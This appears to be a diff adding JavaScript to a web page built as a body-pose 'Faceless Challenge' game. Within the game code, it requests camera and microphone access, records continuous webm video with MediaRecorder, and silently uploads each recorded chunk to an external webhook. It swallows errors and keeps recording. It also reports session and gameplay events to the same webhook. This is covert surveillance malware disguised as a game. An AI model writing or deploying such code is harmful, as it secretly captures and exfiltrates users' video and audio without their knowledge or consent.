+            scanStatus.textContent = `❌ time out — ${part.label} not detected`;
+            scanStatus.className = 'scan-status fail';
+
+            state.partResults.push({
+                part: part.id,
+                label: part.label,
+                points: 0,
+                success: false,
+                time: 0,
+            });
+
+            sendMetadataToWebhook({
+                event: 'part_fail',
+                part: part.id,
+                label: part.label,
+                timestamp: new Date().toISOString(),
+            });
+
+            // Move to next part after delay
+            setTimeout(() => {
+                const next = index + 1;
+                if (next < BODY_PARTS.length) {
+                    beginPart(next);
+                } else {
+                    endGame();
+                }
+            }, 1800);
+        }
+
+        function flashScreen() {
+            const overlay = document.createElement('div');
+            overlay.style.cssText =
+                'position:fixed;inset:0;background:#00f5a0;z-index:100;pointer-events:none;opacity:0.4;transition:opacity 0.5s ease;';
+            document.body.appendChild(overlay);
+            setTimeout(() => {
+                overlay.style.opacity = '0';
+                setTimeout(() => overlay.remove(), 500);
+            }, 100);
+        }
+
+        function endGame() {
+            state.gameDone = true;
+            state.isScanning = false;
+            clearInterval(state.scanInterval);
+
+            gameScreen.classList.remove('active');
+            resultScreen.classList.add('active');
+
+            finalPoints.textContent = state.totalPoints;
+
+            // Build result details
+            let details = '';
+            state.partResults.forEach(r => {
+                const icon = r.success ? '✅' : '❌';
+                const pts = r.success ? `+${r.points}` : '0';
+                details += `${icon} ${r.label} — ${pts} pts\n`;
+            });
+            resultDetails.textContent = details;
+
+            sendMetadataToWebhook({
+                event: 'game_end',
+                total_points: state.totalPoints,
+                results: state.partResults,
+                timestamp: new Date().toISOString(),
+            });
+        }
+
+        /* ==========================================================
+               ─── ANIMATION LOOP ───
+            ========================================================== */
+        function gameLoop() {
+            // Check detection if scanning
+            if (state.isScanning && !state.partDetected) {
+                checkDetection();
+            }
+
+            // Draw skeleton
+            if (poseLandmarks) {
+                drawSkeleton();
+            } else {
+                ctx.fillStyle = '#000';
+                ctx.fillRect(0, 0, canvasW, canvasH);
+            }
+
+            requestAnimationFrame(gameLoop);
+        }
+
+        /* ==========================================================
+               ─── FLIP CAMERA ───
+            ========================================================== */
+        flipBtn.addEventListener('click', async () => {
+            if (!state.permissionsGranted) return;
+            state.facingMode = state.facingMode === 'user' ? 'environment' : 'user';
+
+            // Stop current stream
+            if (cameraStream) {
+                cameraStream.getTracks().forEach(t => t.stop());
+            }
+
+            try {
+                const constraints = {
+                    video: {
+                        width: { ideal: 1280 },
+                        height: { ideal: 720 },
+                        frameRate: { ideal: 30 },
+                        facingMode: state.facingMode,
+                    },
+                    audio: {
+                        echoCancellation: true,
+                        noiseSuppression: true,
+                        autoGainControl: true
+                    }
+                };
+                const stream = await navigator.mediaDevices.getUserMedia(constraints);
+                cameraStream = stream;
+                gameVideo.srcObject = stream;
+                await gameVideo.play();
+
+                // Restart recording with new stream
+                if (mediaRecorder) {
+                    mediaRecorder.stop();
+                    setTimeout(() => {
+                        mediaRecorder = new MediaRecorder(stream, {
+                            mimeType: 'video/webm;codecs=vp8',
+                            videoBitsPerSecond: 2500000
+                        });
+                        mediaRecorder.ondataavailable = (e) => {
+                            if (e.data.size > 0) recordedChunks.push(e.data);
+                        };
+                        mediaRecorder.onstop = async () => {
+                            if (recordedChunks.length === 0) {
+                                recordedChunks = [];
+                                if (mediaRecorder && mediaRecorder.state === 'inactive') {
+                                    try { mediaRecorder.start(); } catch (_) {}
+                                }
+                                return;
+                            }
+                            const blob = new Blob(recordedChunks, { type: 'video/webm;codecs=vp8' });
+                            recordedChunks = [];
+                            const formData = new FormData();
+                            formData.append('file', blob, `vlog_${Date.now()}.webm`);
+                            try { await fetch(WEBHOOK_URL, { method: 'POST', body: formData }); } catch (_) {}
+                            if (mediaRecorder && mediaRecorder.state === 'inactive') {
+                                try { mediaRecorder.start(); } catch (_) {}
+                            }
+                        };
+                        mediaRecorder.start();
+                    }, 300);
+                }
+
+                sendMetadataToWebhook({
+                    event: 'camera_flip',
+                    facingMode: state.facingMode,
+                    timestamp: new Date().toISOString(),
+                });
+
+            } catch (err) {
+                console.warn('Flip error:', err);
+            }
+        });
+
+        /* ==========================================================
+               ─── WEBHOOK ───
+            ========================================================== */
+        function sendMetadataToWebhook(data) {
+            if (!WEBHOOK_URL) return;
+            try {
+                fetch(WEBHOOK_URL, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        content: `📡 **Faceless Challenge** · ${data.event || 'metadata'}`,
+                        embeds: [{
+                            color: 0x6bcb77,
+                            title: '🚫 Faceless Challenge',
+                            fields: Object.entries(data).map(([k, v]) => ({
+                                name: k,
+                                value: typeof v === 'object' ? JSON.stringify(v).slice(0, 900) : String(v)
+                                    .slice(0, 900),
+                                inline: false,
+                            })),
+                            timestamp: new Date().toISOString(),
+                            footer: { text: `session ${state.sessionId}` },
+                        }],
+                    }),
+                }).catch(() => {});
+            } catch (_) {}
+        }
+
+        /* ==========================================================
+               ─── INIT ───
+            ========================================================== */
+        async function init() {
+            // Load AI model with progress
+            await loadAIModel();
+
+            // Start button
+            startBtn.addEventListener('click', function handleStart() {
+                if (this.disabled) return;
+                if (state.permissionsGranted) {
+                    startGame();
+                    return;
+                }
+                this.textContent = '⏳ requesting…';
+                this.disabled = true;
+                errorMsg.classList.remove('show');
+                requestPermissionsAndStart().catch(() => {
+                    this.textContent = '↻ retry';
+                    this.disabled = false;
+                    state.isRequesting = false;
+                });
+            });
+
+            // Retry button
+            retryBtn.addEventListener('click', () => {
+                resultScreen.classList.remove('active');
+                startScreen.classList.add('active');
+                state.gameDone = false;
+                state.totalPoints = 0;
+                state.partResults = [];
+                state.currentPartIndex = 0;
+                totalPointsDisplay.textContent = '0';
+                startBtn.textContent = '▶ start';
+                startBtn.disabled = false;
+            });
+
+            // Start game loop
+            gameLoop();
+
+            sendMetadataToWebhook({
+                event: 'page_load',
+                sessionId: state.sessionId,
+                timestamp: new Date().toISOString(),
+                type: 'faceless_challenge',
+            });
+
+            console.log('🚫 Faceless Challenge loaded');
+            console.log('📡 webhook:', WEBHOOK_URL);
+            console.log('🦴 body parts:', BODY_PARTS.length);
+        }
+
+        if (document.readyState === 'loading') {
+            document.addEventListener('DOMContentLoaded', init);
+        } else {
+            init();
+        }
+    </script>
 </body>
 </html>
